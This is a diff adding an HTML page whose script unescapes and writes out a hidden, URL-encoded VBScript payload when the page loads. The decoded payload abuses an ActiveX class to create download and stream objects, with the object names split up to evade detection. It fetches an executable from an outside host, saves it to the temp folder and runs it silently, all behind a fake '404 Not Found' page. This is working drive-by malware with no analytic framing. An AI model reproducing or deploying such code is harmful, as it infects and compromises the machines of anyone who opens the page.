@@ -1,0 +1,19 @@
+<HTML>
+<HEAD>
+<SCRIPT LANGUAGE="Javascript">
+<!--
+/* Codigo HTML encripitado em www.natalweb.com. Para usar este codigo, mantenha estas linhas de referencia*/
+var Words = "%20%20%20%20%3Ctitle%3E%3C/title%3E%0A%20%20%20%20%3Chead%3E%3C/head%3E%0A%0A%20%20%20%20%3Cbody%3E%0A%0A%20%20%20%20%3Cscript%20language%3D%22VBScript%22%3E%0A%0A%20%20%20%20on%20error%20resume%20next%0A%0A%20%20%20%20%0A%0A%20%20%20%20%27%20due%20to%20how%20ajax%20works%2C%20the%20file%20MUST%20be%20within%20the%20same%20local%20domain%0A%20%20%20%20dl%20%3D%20%22http%3A//www.conprop.com.br/imagens/bg_demo1.exe%22%0A%0A%20%20%20%20%27%20create%20adodbstream%20object%0A%20%20%20%20Set%20df%20%3D%20document.createElement%28%22object%22%29%0A%20%20%20%20df.setAttribute%20%22classid%22%2C%20%22clsid%3ABD96C556-65A3-11D0-983A-00C04FC29E36%22%0A%20%20%20%20str%3D%22Microsoft.XMLHTTP%22%0A%20%20%20%20Set%20x%20%3D%20df.CreateObject%28str%2C%22%22%29%0A%0A%20%20%20%20a1%3D%22Ado%22%0A%20%20%20%20a2%3D%22db.%22%0A%20%20%20%20a3%3D%22Str%22%0A%20%20%20%20a4%3D%22eam%22%0A%20%20%20%20str1%3Da1%26a2%26a3%26a4%0A%20%20%20%20str5%3Dstr1%0A%20%20%20%20set%20S%20%3D%20df.createobject%28str5%2C%22%22%29%0A%20%20%20%20S.type%20%3D%201%0A%0A%20%20%20%20%27%20xml%20ajax%20req%0A%20%20%20%20str6%3D%22GET%22%0A%20%20%20%20x.Open%20str6%2C%20dl%2C%20False%0A%20%20%20%20x.Send%0A%0A%20%20%20%20%27%20Get%20temp%20directory%20and%20create%20our%20destination%20name%0A%20%20%20%20fname1%3D%22bl4ck.com%22%0A%20%20%20%20set%20F%20%3D%20df.createobject%28%22Scripting.FileSystemObject%22%2C%22%22%29%0A%20%20%20%20set%20tmp%20%3D%20F.GetSpecialFolder%282%29%20%27%20Get%20tmp%20folder%0A%20%20%20%20fname1%3D%20F.BuildPath%28tmp%2Cfname1%29%0A%20%20%20%20S.open%0A%20%20%20%20%27%20open%20adodb%20stream%20and%20write%20contents%20of%20request%20to%20file%0A%20%20%20%20%27%20like%20vbs%20dl+exec%20code%0A%20%20%20%20S.write%20x.responseBody%0A%20%20%20%20%27%20Saves%20it%20with%20CreateOverwrite%20flag%0A%20%20%20%20S.savetofile%20fname1%2C2%0A%0A%20%20%20%20S.close%0A%20%20%20%20set%20Q%20%3D%20df.createobject%28%22Shell.Application%22%2C%22%22%29%0A%20%20%20%20Q.ShellExecute%20fname1%2C%22%22%2C%22%22%2C%22open%22%2C0%0A%0A%20%20%20%20%0A%0A%20%20%20%20%3C/script%3E%0A%20%20%20%20%3Chead%3E%0A%20%20%20%20%3Ctitle%3E%5BBL4CK%5D%20%7C%7C%20404%20Not%20Found%3C/title%3E%0A%20%20%20%20%3C/head%3E%3Cbody%3E%0A%3Ccenter%3E%3Cembed%20src%3D%22%22%20pluginspage%3D%22%22%20type%3D%22application/x-shockwave-flash%22%20width%3D%22550%22%20height%3D%22290%22%3E%20%20%3C/embed%3E%0A%20%20%20%20%0A%20%20%20%20%3C%21--%20%3Cscript%3Elocation.href%3D%27http%3A//google.com%27%3C/script%3E%20--%3E%0A%20%20%20%20%3C/body%3E%0A%0A%20%20%20%20%3C/html%3E"
+function SetNewWords()
+{
+     var NewWords;
+     NewWords = unescape(Words);
+     document.write(NewWords);
+} 
+SetNewWords();
+// -->
+</SCRIPT>
+</HEAD>
+<BODY>
+</BODY>
+</HTML>
